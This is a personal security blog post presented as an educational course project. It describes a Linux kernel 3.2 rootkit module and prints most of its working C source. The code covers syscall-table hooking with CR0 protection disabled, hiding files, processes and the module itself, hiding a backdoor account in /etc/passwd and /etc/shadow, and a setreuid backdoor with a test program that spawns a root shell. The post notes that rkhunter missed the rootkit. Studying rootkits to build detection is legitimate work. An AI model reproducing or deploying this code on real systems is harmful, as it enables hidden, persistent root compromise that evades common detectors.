@@ -1,0 +1,269 @@
+<!DOCTYPE html> <html lang="en"> <head> <meta http-equiv="Content-Type" content="text/html; charset=UTF-8"> <meta charset="utf-8"> <meta name="viewport" content="width=device-width, initial-scale=1, shrink-to-fit=no"> <meta http-equiv="X-UA-Compatible" content="IE=edge"> <title>Rootkit module in Linux Kernel 3.2 | Hyungjoon (Kevin) Koo</title> <meta name="author" content="Hyungjoon Koo"> <meta name="description" content=""> <link rel="stylesheet" href="/assets/css/bootstrap.min.css?a4b3f509e79c54a512b890d73235ef04"> <link rel="stylesheet" href="https://cdn.jsdelivr.net/npm/mdbootstrap@4.20.0/css/mdb.min.css" integrity="sha256-jpjYvU3G3N6nrrBwXJoVEYI/0zw8htfFnhT9ljN3JJw=" crossorigin="anonymous"> <link defer rel="stylesheet" href="https://unpkg.com/bootstrap-table@1.22.1/dist/bootstrap-table.min.css"> <link rel="stylesheet" href="/assets/css/academicons.min.css?f0b7046b84e425c55f3463ac249818f5"> <link rel="stylesheet" type="text/css" href="https://fonts.googleapis.com/css?family=Roboto:300,400,500,700|Roboto+Slab:100,300,400,500,700|Material+Icons"> <link rel="stylesheet" href="/assets/css/jekyll-pygments-themes-github.css?19f3075a2d19613090fe9e16b564e1fe" media="" id="highlight_theme_light"> <link rel="stylesheet" href="/assets/css/main.css?d41d8cd98f00b204e9800998ecf8427e"> <link rel="canonical" href="https://kevinkoo001.github.io/blog/2014/rootkit-module-in-linux-kernel-3-2/"> <link rel="stylesheet" href="/assets/css/jekyll-pygments-themes-native.css?e74e74bf055e5729d44a7d031a5ca6a5" media="none" id="highlight_theme_dark"> <script src="/assets/js/theme.js?96d6b3e1c3604aca8b6134c7afdd5db6"></script> <script src="/assets/js/dark_mode.js?9b17307bb950ffa2e34be0227f53558f"></script> </head> <body class="fixed-top-nav "> <header> <nav id="navbar" class="navbar navbar-light navbar-expand-sm fixed-top"> <div class="container"> <a class="navbar-brand title font-weight-lighter" href="/">Hyungjoon (Kevin) Koo</a> <button class="navbar-toggler collapsed ml-auto" type="button" data-toggle="collapse" data-target="#navbarNav" aria-controls="navbarNav" aria-expanded="false" aria-label="Toggle navigation"> <span class="sr-only">Toggle navigation</span> <span class="icon-bar top-bar"></span> <span class="icon-bar middle-bar"></span> <span class="icon-bar bottom-bar"></span> </button> <div class="collapse navbar-collapse text-right" id="navbarNav"> <ul class="navbar-nav ml-auto flex-nowrap"> <li class="nav-item "> <a class="nav-link" href="/">About</a> </li> <li class="nav-item active"> <a class="nav-link" href="/blog/">Blog<span class="sr-only">(current)</span></a> </li> <li class="nav-item "> <a class="nav-link" href="/publications/">Publications</a> </li> <li class="nav-item "> <a class="nav-link" href="/cv/">CV</a> </li> <li class="toggle-container"> <button id="light-toggle" title="Change theme"> <i class="fas fa-moon"></i> <i class="fas fa-sun"></i> </button> </li> </ul> </div> </div> </nav> <progress id="progress" value="0"> <div class="progress-container"> <span class="progress-bar"></span> </div> </progress> </header> <div class="container mt-5"> <div class="post"> <header class="post-header"> <h1 class="post-title">Rootkit module in Linux Kernel 3.2</h1> <p class="post-meta">December 23, 2014• kevinkoo001@gmail.com</p> <p class="post-tags"> <a href="/blog/2014"> <i class="fas fa-calendar fa-sm"></i> 2014 </a>   ·   <a href="/blog/category/attack-amp-defense-cyber-warfare"> <i class="fas fa-tag fa-sm"></i> Attack &amp; Defense, Cyber Warfare</a>   </p> </header> <article class="post-content"> <div id="markdown-content"> <p><a href="http://newt.arvixe.com/~mrkoo001/blog/wp-content/uploads/2014/12/matrix-rootkit.jpg" rel="external nofollow noopener" target="_blank"><img src="http://newt.arvixe.com/~mrkoo001/blog/wp-content/uploads/2014/12/matrix-rootkit.jpg" alt="matrix-rootkit"></a></p> <p>This <em>rootkit _has been created for educational purpose with Chen as part of course project. _Rootkit</em> itself is not one of malicious-oriented concepts, but it is often classified as malware kinds because of its powerful manipulation techniques in system. Here is brief introduction about both principle and implementation.</p> <p><strong>1. System call table Hooking</strong></p> <p>As you might imagine, one of common techniques - system call table hooking - has been employed. The processes in user space in Linux call a variety of interrupts to kernel space. Those interrupts are stored in predefined table, IDT or interrupt descriptor table while initialization process in Linux. It stores the registered function pointers to handle diverse interrupts. The “system call table” contains the data structure to process system calls when calling interrupt 0x80 in Linux. The idea is to manipulate the function pointers in system call table with hijacking in order to insert desired actions. The original system call has been stored somewhere to avoid unwanted system crash.</p> <p><strong>2. Target Platform</strong></p> <p>ubuntu-12.04.1 64 bits, LTS kernel 3.2.0-29-generic</p> <p><strong>3. Features</strong></p> <ul> <li> <p>Adopt extendable structure design and the initial framework</p> </li> <li> <p>Hide specific files and directories with defined prefixes (i.e <em>hide</em>, bad_,_ ) from showing up when a user does “<em>ls</em>” and similar commands</p> </li> <li> <p>Hide a backdoor account with defined account (i.e_ daemon_) by modifying the /<em>etc/passwd</em> and <em>/etc/shadow</em></p> </li> <li> <p>Hide processes from the process table</p> </li> <li> <p>Hide the <em>rootkit</em> module itself</p> </li> <li> <p>Privilege escalation to gain root through running a specially crafted executable</p> </li> </ul> <p><strong>4. Implementations</strong></p> <p>This part illustrates main parts of code snippets and descriptions. Overall, the design of the <em>rookit</em> has considered an extendable structure. It is simple to add new features as well as debugging and cooperative tasks on top of current architecture. You may want to check out full codes in my <em>github</em> here: <a href="https://github.com/kevinkoo001/rootkit" rel="external nofollow noopener" target="_blank">https://github.com/kevinkoo001/rootkit</a></p> <p>(1) Main headers</p> <div class="language-plaintext highlighter-rouge"><div class="highlight"><pre class="highlight"><code>#include &lt;linux/init.h&gt;
+#include &lt;linux/kernel.h&gt;
+#include &lt;linux/errno.h&gt;	// error numbers
+#include &lt;linux/types.h&gt;
+
+#include &lt;linux/module.h&gt;	// struct module
+#include &lt;linux/unistd.h&gt;	// all system call numbers
+#include &lt;linux/cred.h&gt;		// struct cred
+#include &lt;linux/sched.h&gt;	// struct task_struct
+#include &lt;linux/syscalls.h&gt;	// all system calls
+#include &lt;linux/slab.h&gt;
+#include &lt;linux/fs.h&gt;		// virtual file system 
+#include &lt;linux/uaccess.h&gt;
+#include &lt;linux/ioctl.h&gt;
+#include &lt;linux/miscdevice.h&gt;
+#include &lt;linux/string.h&gt;	// String manipulation
+#include &lt;linux/kobject.h&gt;	// Define kobjects, stuructures, and functions
+#include &lt;linux/namei.h&gt;	// file lookup
+#include &lt;linux/path.h&gt;		// struct path, path_equal()
+#include &lt;linux/file.h&gt;		// struct file *fget(unsigned int fd);
+#include &lt;linux/proc_fs.h&gt;      // struct proc_dir_entry;
+
+#include &lt;asm/system.h&gt;
+#include &lt;asm/current.h&gt;
+#include "config.h"
+</code></pre></div></div> <p>(2) Main part of the <em>rootkit</em></p> <p>The system call table address can be obtained from <em>System.map</em> as following:</p> <div class="language-plaintext highlighter-rouge"><div class="highlight"><pre class="highlight"><code>$ sudo cat /boot/System.map-`uname -r` | grep sys_call_table
+ffffffff81801300 R sys_call_table
+</code></pre></div></div> <p>The following command will not work in kernel 3.x because it does not allow export to <em>/proc/kallsyms</em></p> <div class="language-plaintext highlighter-rouge"><div class="highlight"><pre class="highlight"><code>$ sudo cat /proc/kallsyms | grep sys_call_table
+0000000000000000 R sys_call_table
+</code></pre></div></div> <p>Hence we used PROT_DISABLE and PROT_ENABLE which are the scripts to set system call table to be writable directly by enabling and disabling <strong>cr0</strong> register protection respectively, pre-defined in _config.h. _There are many other (old) techniques to manipulate system call table. (One of well written articles is here by chanam.park: <a href="http://hkpco.kr/paper/crtlk.txt" rel="external nofollow noopener" target="_blank">http://hkpco.kr/paper/crtlk.txt</a>)</p> <div class="language-plaintext highlighter-rouge"><div class="highlight"><pre class="highlight"><code>#define PROT_ENABLE write_cr0(read_cr0() | 0x10000)      // CR0 protection Enabled
+#define PROT_DISABLE write_cr0(read_cr0() &amp; (~ 0x10000)) // CR0 protection Disabled
+</code></pre></div></div> <p>Here are several snippets of main flow.</p> <p>S1 gets the fixed system call table address and the addresses of the original system calls. S2 initializes the module with overwriting original system calls S3 demonstrates hiding/revealing this module itself S4 restores manipulated system calls to the original ones</p> <p>For S3, we have tested to find the root module in kernel with various attempts.</p> <div class="language-plaintext highlighter-rouge"><div class="highlight"><pre class="highlight"><code># lsmod | grep kcr
+# modprobe
+# cat /proc/modules | grep kcr
+# cat /proc/kallsyms | grep "\[kcr\]"
+# ls -la /sys/module | grep kcr
+</code></pre></div></div> <p>a. [S1] Getting system call table address</p> <div class="language-plaintext highlighter-rouge"><div class="highlight"><pre class="highlight"><code>// System call table adddress
+static unsigned long *sys_call_table = (unsigned long *) 0xffffffff81801300;
+
+// Get the addresses of the original system calls
+asmlinkage long (*original_write)(unsigned int, const char*, size_t);
+asmlinkage long (*original_getdents)(unsigned int, struct linux_dirent64*, unsigned int);
+asmlinkage long (*original_setreuid)(uid_t, uid_t);
+asmlinkage long (*original_open)(const char*, int, int);
+asmlinkage long (*original_read)(unsigned int, char*, size_t);
+</code></pre></div></div> <p>b. [S2] Overwriting original system calls</p> <div class="language-plaintext highlighter-rouge"><div class="highlight"><pre class="highlight"><code>static int 
+__init init_mod(void){
+	
+	misc_register(&amp;kcr);
+	
+	// Set system call table to be writable by changing cr0 register
+	PROT_DISABLE;
+	
+	// Get original system call addr in asm/unistd.h
+	original_write = (void *)sys_call_table[__NR_write];		// __NR_write 64
+	original_getdents = (void *)sys_call_table[__NR_getdents];	// __NR_getdents64 61
+	original_setreuid = (void *)sys_call_table[__NR_setreuid];	// __NR_setreuid 145
+	original_read = (void *)sys_call_table[__NR_read];		// __NR_open 63
+	
+	// Overwrite manipulated system calls
+	sys_call_table[__NR_write] = (unsigned long) my_write;
+	sys_call_table[__NR_getdents] = (unsigned long) my_getdents;
+	sys_call_table[__NR_setreuid] = (unsigned long) my_setreuid;
+	sys_call_table[__NR_read] = (unsigned long) my_read;
+	
+	if(init_HJ_proc() == false)
+		rm_HJ_proc();
+
+	//Changing the control bit back
+	PROT_ENABLE;
+	
+	/*
+	// This feature seems unstable now!
+	// The first insmod is fine, but when rmmod and insmod again.. :(
+	hiding_module();
+	unhiding_module();
+	*/
+
+	return 0;
+}
+</code></pre></div></div> <p>c. [S3] Hiding/Unhiding the module</p> <div class="language-plaintext highlighter-rouge"><div class="highlight"><pre class="highlight"><code>void
+hiding_module(void) {
+	// Save the addr of this module to restore if necessary
+	saved_mod_list_head = THIS_MODULE-&gt;list.prev;
+	saved_kobj_parent = THIS_MODULE-&gt;mkobj.kobj.parent;
+	
+	// Remove this module from the module list and kobject list
+	list_del(&amp;THIS_MODULE-&gt;list);
+	kobject_del(&amp;THIS_MODULE-&gt;mkobj.kobj);
+	
+	// Remove the symbol and string tables for kallsyms
+	// IF NOT SET TO NULL, IT WILL GET THE FOLLOWING ERROR MSG:
+	// "sysfs group ffff8800260e4000 not found for kobject 'rt'"
+	THIS_MODULE-&gt;sect_attrs = NULL;
+	THIS_MODULE-&gt;notes_attrs = NULL;
+}
+
+void
+unhiding_module(void) {
+	int r;
+	
+	// Restore this module to the module list and kobject list
+	list_add(&amp;THIS_MODULE-&gt;list, saved_mod_list_head);
+	if ((r = kobject_add(&amp;THIS_MODULE-&gt;mkobj.kobj, saved_kobj_parent, "rt")) &lt; 0)
+		printk(KERN_ALERT "Error to restore kobject to the list back!!\n");
+}
+</code></pre></div></div> <p>d. [S4] Restoring to original system calls</p> <div class="language-plaintext highlighter-rouge"><div class="highlight"><pre class="highlight"><code>static void 
+__exit exit_mod(void){
+
+	 misc_deregister(&amp;kcr);
+	 
+	// Restore all system calls to the original ones
+	PROT_DISABLE;
+	sys_call_table[__NR_write] = (unsigned long) original_write;
+	sys_call_table[__NR_getdents] = (unsigned long) original_getdents;
+	sys_call_table[__NR_setreuid] = (unsigned long) original_setreuid;
+	sys_call_table[__NR_read] = (unsigned long) original_read;
+
+	if(rm_HJ_proc() == false)
+		panic("oops HJ_proc\n");
+
+	PROT_ENABLE;
+}
+</code></pre></div></div> <p>(3) Hiding files and directories by hijacking _getdents _system call</p> <p>By hooking the “<em>getdents</em>” system call - getting directory entries in a directory and return them to a passed in a buffer - the “<em>my_getdents</em>” function filters out whether or not there are predefined prefixes. If so, overwrite the entry with its successor in an iterative way until reaching the end. The corresponding code is in <em>src/HJ_ls.c</em></p> <div class="language-plaintext highlighter-rouge"><div class="highlight"><pre class="highlight"><code>if(ret){
+		buf = kmalloc(ret, GFP_KERNEL);
+		copy_from_user(buf, dirp,ret);
+		ptr = (char *)buf;
+flag1:		while(ptr &lt; (char *)buf + ret) {
+			curr = (struct dirent *)ptr;
+			str_idx = 0; 
+			tmp = hide_prefix[str_idx];
+			while(tmp){
+				if(strstr(curr-&gt;d_name, tmp)){
+					if(curr != buf)	{
+						prev-&gt;d_reclen += curr-&gt;d_reclen;
+						goto find;
+					}
+					else{
+						ret -= curr-&gt;d_reclen;
+						memcpy(curr, curr + curr-&gt;d_reclen, ret);
+						goto flag1;
+					}
+				}else{
+					tmp  = hide_prefix[++str_idx];
+					continue; 
+				}
+			}
+			goto notfound;
+find:			ptr += curr-&gt;d_reclen;
+			goto flag1;
+notfound:		prev = curr;                  
+			ptr += curr-&gt;d_reclen;
+		}	
+		copy_to_user(dirp, buf, ret);
+		kfree(buf);
+}
+</code></pre></div></div> <p>(4) Hiding a credential by hijacking <em>read</em> system call</p> <p>Once the <em>file</em> turns out to be a normal file from file descriptor, <em>fd</em>, then the idea is to assign three pointers pointing to the specific position. Then leave out specific strings and copy the remainder.The corresponding code is in <em>src/HJ_read.c</em></p> <div class="language-plaintext highlighter-rouge"><div class="highlight"><pre class="highlight"><code>if(file) {
+	// Get the absolute path of current file
+	file_path = file-&gt;f_path;
+	path_get(&amp;file-&gt;f_path);
+	tmp = (char *)__get_free_page(GFP_TEMPORARY);
+	abs_path = d_path(&amp;file_path, tmp, PAGE_SIZE);
+	path_put(&amp;file_path);
+	free_page(tmp);
+
+	ret = original_read(fd, buf, count);
+
+	// If the targeted file and some sanity checks
+	if(ret &amp;&amp; (strcmp(abs_path, passwd) == 0 || strcmp(abs_path, shadow) == 0)) {
+		
+		// Allocate new buffer and copy string from user space
+		buf2 = kmalloc(ret, GFP_KERNEL);
+		copy_from_user(buf2, buf, ret);
+		/* 
+			Do string manipulation to hide an attacker's account
+			Set the three pointers, and leave out the target 
+		*/
+		ptr1 = buf2;
+		ptr2 = strstr(buf2, hide_str);
+		ptr3 = ptr2;
+		
+		while (*ptr3 != *delimiter)
+			ptr3++;
+			
+		ret -= (unsigned long)(ptr3 - ptr2);
+		buf_len_to_copy = ptr1 + strlen(buf2) - ptr3;
+		
+		ptr3++;
+		for (i = 0; i &lt; buf_len_to_copy; i++)
+			*ptr2++ = *ptr3++;
+		buf2[(void*)ptr2 - (void*)ptr1] = NULL;
+		
+		// Copy the altered string to user space
+		copy_to_user(buf, buf2, ret);
+		kfree(buf2);
+	}
+}
+</code></pre></div></div> <p>(5) Hiding a process by hijacking <em>filldir</em> system call</p> <p>Since /<em>proc</em> is a mounted file system in Linux, it should be able to provide a VFS interface to the user programs and library code to use. By hooking one of the interfaces, and replacing it with another, <em>my_filldir</em>, it allows to intercept its system call when user program tries to register the call back function instead. It will return 0 when having specified process to hide. The corresponding code is in <em>src/HJ_proc.c</em>.</p> <div class="language-plaintext highlighter-rouge"><div class="highlight"><pre class="highlight"><code>static int 
+my_filldir(void *buf, char *proc_name, int len, loff_t off, u64 ino, unsigned int d_type){
+	// hide the processes
+	unsigned int i = 0;
+	char *str = hide_proc[i++];
+	while(str){
+		if(!strcmp(proc_name, str)){
+			printk("haha\n");
+			return 0;
+		}
+		str = hide_proc[i++];
+	}
+	return original_filldir(buf, proc_name, len, off, ino, d_type);	
+}
+
+static int 
+my_proc_readdir(struct file* filep, void *dirent, filldir_t filldir){
+	original_filldir = filldir;
+	return original_proc_readdir(filep, dirent, my_filldir);
+}
+
+bool 
+init_HJ_proc(){
+	//name the dummy proc with hide_ prefix so that it won't show when user try to check /proc with ls
+	hide_HJ_dummy = create_proc_entry("hide_dummy", 0777, NULL);
+	HJ_target = hide_HJ_dummy-&gt;parent;
+	fops_ptr = ((struct file_operations *)HJ_target-&gt;proc_fops);
+	original_proc_readdir = fops_ptr-&gt;readdir;
+	fops_ptr-&gt;readdir = my_proc_readdir;
+	return true;
+}
+
+bool 
+rm_HJ_proc(){
+	remove_proc_entry("dummy", NULL);
+	fops_ptr-&gt;readdir = original_proc_readdir;
+	return true;
+}
+</code></pre></div></div> <p>(6) Privilege Escalation</p> <div class="language-plaintext highlighter-rouge"><div class="highlight"><pre class="highlight"><code>asmlinkage long
+my_setreuid(uid_t ruid, uid_t euid) {
+
+	// Hooking a certain condition below
+	if( (ruid == BACKDOOR_RUID) &amp;&amp; (euid == BACKDOOR_EUID) ) {
+		struct cred *credential = prepare_creds();
+
+		// Set the permission of the current process to root
+		credential -&gt; uid = 0;
+		credential -&gt; gid = 0;
+		credential -&gt; euid = 0;
+		credential -&gt; egid = 0;
+		credential -&gt; suid = 0;
+		credential -&gt; sgid = 0;
+		credential -&gt; fsuid = 0;
+		credential -&gt; fsgid = 0;
+		
+		return commit_creds(credential);
+	}
+	
+	// Otherwise just call original function
+	return original_setreuid(ruid, euid);
+}
+</code></pre></div></div> <p>If a certain set of (<em>ruid</em>/<em>euid</em>) is configured to a normal program with a user privilege (i.e <em>ruid</em> = 1234, <em>euid =</em> 5678), it will obtain a root privilege with this backdoor at once. The “<em>cred</em>” structure has been used in _linux/cred.h. _The following is a simple test code to test backdoor feature.</p> <div class="language-plaintext highlighter-rouge"><div class="highlight"><pre class="highlight"><code>#include &lt;stdio.h&gt;
+
+int main(void)
+{
+	int ruid = 1234;
+	int euid = 5678;
+	
+	setreuid(ruid, euid);
+	system("/bin/sh");
+}
+</code></pre></div></div> <p>Lastly, I have made an attempt to detect the <em>rootkit</em> with existing tools - <em>chkrookit</em> and <em>rkhunter</em> - to see if they can detect it.  Interesting enough, <em>rkhunter</em> does not detect anything, meaning that the following results are exactly the same with the one before infection whereas <em>chkrootkit</em> discovered 2 hidden processes.</p> <p>Note that any misuse of this article would be beyond my scope of responsibility. </p> <p><strong>5. References</strong></p> <ul> <li> <p>Linux Kernel Programming Guide, <a href="http://www.tldp.org/LDP/lkmpg/2.6/html/index.html" rel="external nofollow noopener" target="_blank">http://www.tldp.org/LDP/lkmpg/2.6/html/index.html</a></p> </li> <li> <p>Linux Device Drivers, Third Edition, <a href="http://lwn.net/Kernel/LDD3/" rel="external nofollow noopener" target="_blank">http://lwn.net/Kernel/LDD3/</a></p> </li> <li> <p>Linux man – <em>strace</em>, <a href="http://linux.die.net/man/1/strace" rel="external nofollow noopener" target="_blank">http://linux.die.net/man/1/strace</a></p> </li> <li> <p>Linux Cross Reference, <a href="http://lxr.linux.no/" rel="external nofollow noopener" target="_blank">http://lxr.linux.no/</a></p> </li> <li> <p>Linux Cross Reference, <a href="http://lxr.free-electrons.com/search" rel="external nofollow noopener" target="_blank">http://lxr.free-electrons.com/search</a></p> </li> <li> <p>Jamie Butler and Greg Hoglund, VICE – Catch the hookers! In blackhat US 2004, <a href="http://www.blackhat.com/presentations/bh-usa-04/bh-us-04-butler/bh-us-04-butler.pdf" rel="external nofollow noopener" target="_blank">http://www.blackhat.com/presentations/bh-usa-04/bh-us-04-butler/bh-us-04-butler.pdf</a></p> </li> <li> <p>Andreas Bunten, UNIX and Linux based Kernel Rooktkits, DIMVA 2004, <a href="http://www.kernelhacking.com/rodrigo/docs/StMichael/BuntenSlides.pdf" rel="external nofollow noopener" target="_blank">http://www.kernelhacking.com/rodrigo/docs/StMichael/BuntenSlides.pdf</a></p> </li> <li> <p>Complete Linux Loadable Kernel Modules, <a href="https://www.thc.org/papers/LKM_HACKING.html" rel="external nofollow noopener" target="_blank">https://www.thc.org/papers/LKM_HACKING.html</a></p> </li> <li> <p><em>Syscall</em> Hijacking Kernel 2.6.* systems in memset’s Blog, <a href="http://memset.wordpress.com/2010/12/03/syscall-hijacking-kernel-2-6-systems/" rel="external nofollow noopener" target="_blank">http://memset.wordpress.com/2010/12/03/syscall-hijacking-kernel-2-6-systems/</a></p> </li> <li> <p><em>chrootkit</em>, <a href="http://www.chkrootkit.org/" rel="external nofollow noopener" target="_blank">http://www.chkrootkit.org/</a></p> </li> <li> <p><em>rkhunter</em>, <a href="http://rkhunter.sourceforge.net/" rel="external nofollow noopener" target="_blank">http://rkhunter.sourceforge.net/</a></p> </li> </ul> </div> </article> <br> <hr> <br> <ul class="list-disc pl-8"></ul> <h2 class="text-3xl font-semibold mb-4 mt-12">Enjoy Reading This Article?</h2> <p class="mb-2">Here are some more articles you might like to read next:</p> <li class="my-2"> <a class="text-pink-700 underline font-semibold hover:text-pink-800" href="/blog/2016/code-reuse-attacks-and-defenses/">Code Reuse Attacks and Defenses</a> </li> <li class="my-2"> <a class="text-pink-700 underline font-semibold hover:text-pink-800" href="/blog/2018/compiler-assisted-code-randomization/">Compiler-assisted Code Randomization</a> </li> <li class="my-2"> <a class="text-pink-700 underline font-semibold hover:text-pink-800" href="/blog/2016/dynamic-linking-in-elf/">Dynamic Linking in ELF</a> </li> <li class="my-2"> <a class="text-pink-700 underline font-semibold hover:text-pink-800" href="/blog/2016/cyber-grand-challenge-by-darpa/">Cyber Grand Challenge by DARPA</a> </li> <li class="my-2"> <a class="text-pink-700 underline font-semibold hover:text-pink-800" href="/blog/2016/juggling-the-gadgets-instruction-displacement-to-mitigate-code-reuse-attack/">Juggling the Gadgets: Instruction Displacement to Mitigate Code Reuse Attack</a> </li> </div> </div> <footer class="fixed-bottom"> <div class="container mt-0"> © Copyright 2024 Hyungjoon Koo. Last updated: February 27, 2024. </div> </footer> <script src="https://cdn.jsdelivr.net/npm/jquery@3.6.0/dist/jquery.min.js" integrity="sha256-/xUj+3OJU5yExlq6GSYGSHk7tPXikynS7ogEvDej/m4=" crossorigin="anonymous"></script> <script src="/assets/js/bootstrap.bundle.min.js"></script> <script src="https://cdn.jsdelivr.net/npm/mdbootstrap@4.20.0/js/mdb.min.js" integrity="sha256-NdbiivsvWt7VYCt6hYNT3h/th9vSTL4EDWeGs5SN3DA=" crossorigin="anonymous"></script> <script defer src="https://cdn.jsdelivr.net/npm/masonry-layout@4.2.2/dist/masonry.pkgd.min.js" integrity="sha256-Nn1q/fx0H7SNLZMQ5Hw5JLaTRZp0yILA/FRexe19VdI=" crossorigin="anonymous"></script> <script defer src="https://cdn.jsdelivr.net/npm/imagesloaded@4/imagesloaded.pkgd.min.js"></script> <script defer src="/assets/js/masonry.js" type="text/javascript"></script> <script defer src="https://cdn.jsdelivr.net/npm/medium-zoom@1.0.8/dist/medium-zoom.min.js" integrity="sha256-7PhEpEWEW0XXQ0k6kQrPKwuoIomz8R8IYyuU1Qew4P8=" crossorigin="anonymous"></script> <script defer src="/assets/js/zoom.js?7b30caa5023af4af8408a472dc4e1ebb"></script> <script defer src="https://unpkg.com/bootstrap-table@1.22.1/dist/bootstrap-table.min.js"></script> <script src="/assets/js/no_defer.js?d633890033921b33e0ceb13d22340a9c"></script> <script defer src="/assets/js/common.js?acdb9690d7641b2f8d40529018c71a01"></script> <script defer src="/assets/js/copy_code.js?c9d9dd48933de3831b3ee5ec9c209cac" type="text/javascript"></script> <script async src="https://d1bxh8uas1mnw7.cloudfront.net/assets/embed.js"></script> <script async src="https://badge.dimensions.ai/badge.js"></script> <script type="text/javascript">window.MathJax={tex:{tags:"ams"}};</script> <script defer type="text/javascript" id="MathJax-script" src="https://cdn.jsdelivr.net/npm/mathjax@3.2.0/es5/tex-mml-chtml.js"></script> <script defer src="https://polyfill.io/v3/polyfill.min.js?features=es6"></script> <script type="text/javascript">function progressBarSetup(){"max"in document.createElement("progress")?(initializeProgressElement(),$(document).on("scroll",function(){progressBar.attr({value:getCurrentScrollPosition()})}),$(window).on("resize",initializeProgressElement)):(resizeProgressBar(),$(document).on("scroll",resizeProgressBar),$(window).on("resize",resizeProgressBar))}function getCurrentScrollPosition(){return $(window).scrollTop()}function initializeProgressElement(){let e=$("#navbar").outerHeight(!0);$("body").css({"padding-top":e}),$("progress-container").css({"padding-top":e}),progressBar.css({top:e}),progressBar.attr({max:getDistanceToScroll(),value:getCurrentScrollPosition()})}function getDistanceToScroll(){return $(document).height()-$(window).height()}function resizeProgressBar(){progressBar.css({width:getWidthPercentage()+"%"})}function getWidthPercentage(){return getCurrentScrollPosition()/getDistanceToScroll()*100}const progressBar=$("#progress");window.onload=function(){setTimeout(progressBarSetup,50)};</script> </body> </html>
